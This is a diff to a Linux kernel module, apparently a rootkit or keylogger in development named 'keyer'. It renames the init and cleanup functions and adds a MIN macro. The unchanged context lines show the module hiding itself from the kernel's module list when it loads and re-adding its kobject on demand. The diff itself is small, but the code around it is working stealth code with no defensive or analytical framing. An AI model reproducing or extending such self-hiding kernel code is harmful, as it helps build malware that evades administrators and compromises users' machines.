@@ -2,6 +2,11 @@
 #include <linux/kernel.h>    // included for KERN_INFO
 #include <linux/init.h>      // included for __init and __exit macros
 
+#define MIN(a,b) \
+   ({ typeof (a) _a = (a); \
+      typeof (b) _b = (b); \
+     _a < _b ? _a : _b; })
+
 static char module_hidden = 0;
 
 static struct list_head *module_previous;
@@ -36,21 +41,18 @@ void module_show(void)
 	result = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "keyer");
 	module_hidden = !module_hidden;
 }
-
-static int __init hello_init(void)
+static int __init keyer_init(void)
 {
-
-
     printk(KERN_INFO "Hello world!\n");
     module_hide();
     return 0;    // Non-zero return means that the module couldn't be loaded.
 }
 
-static void __exit hello_cleanup(void)
+static void __exit keyer_cleanup(void)
 {
     printk(KERN_INFO "Cleaning up module.\n");
 }
 
 
-module_init(hello_init);
-module_exit(hello_cleanup);
+module_init(keyer_init);
+module_exit(keyer_cleanup);
